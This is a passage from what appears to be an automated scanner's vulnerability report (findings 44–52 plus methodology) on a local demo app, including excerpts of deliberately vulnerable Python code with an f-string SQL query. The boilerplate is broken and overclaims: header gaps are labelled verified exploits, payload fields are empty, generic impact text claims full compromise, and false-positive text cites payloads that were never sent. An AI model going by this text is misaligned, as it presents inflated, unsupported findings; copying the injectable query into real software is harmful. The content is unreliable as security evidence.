**Remediation.** Send Cross-Origin-Opener-Policy: same-origin.

### 44. [INFO] Missing Cross-Origin-Resource-Policy

- **Class:** Security Misconfiguration
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET /`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-200
- **Module:** security-headers

**Description.** Without CORP, the resource can be loaded by any origin (subject to CORS); useful as defence-in-depth against Spectre-style attacks.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
Response headers did not include 'cross-origin-resource-policy'.
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -G 'http://127.0.0.1:8081/'
```

**Raw HTTP exchange:**

```http
GET / HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/ in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Send Cross-Origin-Resource-Policy: same-origin.

### 45. [INFO] Missing X-DNS-Prefetch-Control

- **Class:** Security Misconfiguration
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET /`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-200
- **Module:** security-headers

**Description.** Without X-DNS-Prefetch-Control: off, browsers may prefetch cross-origin hostnames in links, leaking user behaviour to third-party DNS resolvers.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
Response headers did not include 'x-dns-prefetch-control'.
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -G 'http://127.0.0.1:8081/'
```

**Raw HTTP exchange:**

```http
GET / HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/ in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Send X-DNS-Prefetch-Control: off (or use <link rel=dns-prefetch> selectively).

### 46. [INFO] Missing X-Permitted-Cross-Domain-Policies

- **Class:** Security Misconfiguration
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET /`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-16
- **Module:** security-headers

**Description.** Without X-Permitted-Cross-Domain-Policies: none, legacy Flash / PDF plugins may embed the site cross-domain.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
Response headers did not include 'x-permitted-cross-domain-policies'.
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -G 'http://127.0.0.1:8081/'
```

**Raw HTTP exchange:**

```http
GET / HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/ in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Send X-Permitted-Cross-Domain-Policies: none.

### 47. [INFO] Missing Pragma: no-cache (legacy)

- **Class:** Security Misconfiguration
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET /`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-525
- **Module:** security-headers

**Description.** No Pragma header; legacy HTTP/1.0 caches may still store the response. Modern Cache-Control is preferred, but Pragma adds belt-and-braces protection.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
Response headers did not include 'pragma'.
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -G 'http://127.0.0.1:8081/'
```

**Raw HTTP exchange:**

```http
GET / HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/ in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Send Pragma: no-cache on sensitive responses alongside Cache-Control.

### 48. [INFO] Technology stack identified (4 components)

- **Class:** Information Disclosure / Source Exposure
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET /`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-200
- **Module:** tech-fingerprint

**Description.** The response headers, cookies and HTML identify the underlying web stack. Use this to drive targeted CVE research and exploit-selection for the active phase.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
Framework: Express
Language: Node.js
OS: Ubuntu
Web server: nginx
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -G 'http://127.0.0.1:8081/'
```

**Raw HTTP exchange:**

```http
GET / HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/ in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Strip identifying response headers (Server, X-Powered-By, X-AspNet-Version) and remove generator meta tags to reduce passive fingerprinting surface.

### 49. [INFO] Authentication form detected (manual auth testing recommended)

- **Class:** Brute-Force / Credential Stuffing
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET /`
- **Status:** confidence: tentative (exploit attempted)
- **CWE:** CWE-307
- **Module:** advisory

**Description.** A login form was found. Manually test rate limiting/lockout (brute-force, credential stuffing), MFA bypass, session fixation, and OAuth/SAML config.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
Password input present on page.
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -G 'http://127.0.0.1:8081/'
```

**Raw HTTP exchange:**

```http
GET / HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/ in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Enforce rate limiting/lockout, MFA, session rotation on login, and validate SSO config.

### 50. [INFO] IDOR-candidate parameter 'id'

- **Class:** IDOR
- **URL:** http://127.0.0.1:8081/item
- **Injection point:** `GET /item`
- **Status:** confidence: tentative (exploit attempted)
- **CWE:** CWE-639
- **Module:** advisory

**Description.** 'id' looks like a direct object reference. Manually test access control by changing it across accounts (IDOR / horizontal & vertical priv-esc).

#### Vulnerable code location

**Source-mapped sink:** `examples/vulnerable_app.py` (lines 170-179), inside **item**. The line marked with `->` is where the injectable input reaches the dangerous sink.

```py
      165 |     # Reflected XSS: q echoed unencoded.
      166 |     return f"<html><body>Results for: {q}</body></html>"
      167 | 
      168 | 
      169 | @app.get("/item", response_class=HTMLResponse)
  ->  170 | def item(id: str = "1") -> HTMLResponse:
      171 |     # Error-based SQLi simulation: a quote breaks the "query". The error
      172 |     # message is fixed (no input echo) so this stays a pure SQLi demo.
      173 |     if "'" in id or '"' in id:
      174 |         return HTMLResponse(
      175 |             "You have an error in your SQL syntax; check the manual that "
```

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
id=1 (numeric object identifier).
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -G --data-urlencode 'id=1' 'http://127.0.0.1:8081/item'
```

**Raw HTTP exchange:**

```http
GET /item?id=1 HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/item in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Enforce per-object authorization server-side; use unguessable references.

### 51. [INFO] IDOR-candidate parameter 'id'

- **Class:** IDOR
- **URL:** http://127.0.0.1:8081/product
- **Injection point:** `GET /product`
- **Status:** confidence: tentative (exploit attempted)
- **CWE:** CWE-639
- **Module:** advisory

**Description.** 'id' looks like a direct object reference. Manually test access control by changing it across accounts (IDOR / horizontal & vertical priv-esc).

#### Vulnerable code location

**Source-mapped sink:** `examples/vulnerable_app.py` (lines 181-198), inside **product**. The line marked with `->` is where the injectable input reaches the dangerous sink.

```py
      181 | def product(id: str = "1") -> HTMLResponse:
      182 |     # REAL error-based + UNION SQLi against sqlite3 (stdlib, in-memory).
      183 |     # The id is interpolated straight into the query on purpose.
      184 |     conn = _db()
      185 |     try:
  ->  186 |         rows = conn.execute(
      187 |             f"SELECT id, name, price FROM products WHERE id={id}"
      188 |         ).fetchall()
      189 |         body = "".join(f"<div>#{r[0]} {r[1]} price={r[2]}</div>" for r in rows)
      190 |         return HTMLResponse(f"<html><body>{body or 'no product'}</body></html>")
      191 |     except sqlite3.Error:
```

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
id=1 (numeric object identifier).
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -G --data-urlencode 'id=1' 'http://127.0.0.1:8081/product'
```

**Raw HTTP exchange:**

```http
GET /product?id=1 HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/product in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Enforce per-object authorization server-side; use unguessable references.

### 52. [INFO] No WAF / CDN detected via headers

- **Class:** Reconnaissance / Attack-Surface Mapping
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET /`
- **Status:** confidence: tentative
- **Module:** waf-detection

**Description.** No WAF / CDN signatures were detected in the response headers. The target may be directly exposed, or the WAF may be transparent to headers -- behavioural probing during the active phase will confirm.

**Detection evidence.**

```
server=uvicorn, nginx/1.18.0 (Ubuntu)
```

**Remediation.** Confirm origin exposure; deploy a WAF if missing.

## Methodology & limitations

1. **Crawl.** Same-origin crawl of the authorized target discovered 13 URL(s) and 15 injectable target(s) (query parameters and forms).
2. **Detection.** Passive recon modules ran first (attack-surface mapping above); active modules then sent non-destructive probe payloads to detect injection, XSS, traversal, SSRF and misconfiguration classes.
3. **Exploitation.** 12 finding(s) were re-targeted with safe impact-proof exploits: read-only SQL extraction, informational command execution (`id`, `uname`), system-file reads, executable-payload survival checks and loopback fetches. No data was modified or destroyed, and no denial-of-service techniques were used.
4. **False-positive verification.** Findings the exploit phase could not prove were re-tested with control experiments: negative controls (payload with the active ingredient removed), repeat-consistency probes, baseline-cleanliness checks, fresh per-check canaries and differential directionality. 34 passed all controls; 1 were flagged for manual review. A succeeded exploit is its own false-positive disproof, so it bypasses this battery.
5. **Code attribution.** Source mapping was performed against `examples`; each mapped finding cites the vulnerable file, line range and sink excerpt.
6. **Reporting.** Every claim in this report is backed by the captured request/response evidence shown alongside it. Findings that could not be proven are explicitly labelled with their confidence (tentative/firm) rather than overclaimed.

**Limitations.** Automated testing cannot cover business-logic flaws, authenticated flows without credentials, or client-side-only rendering. Candidates flagged for manual review should be verified by a human before triage decisions are made.
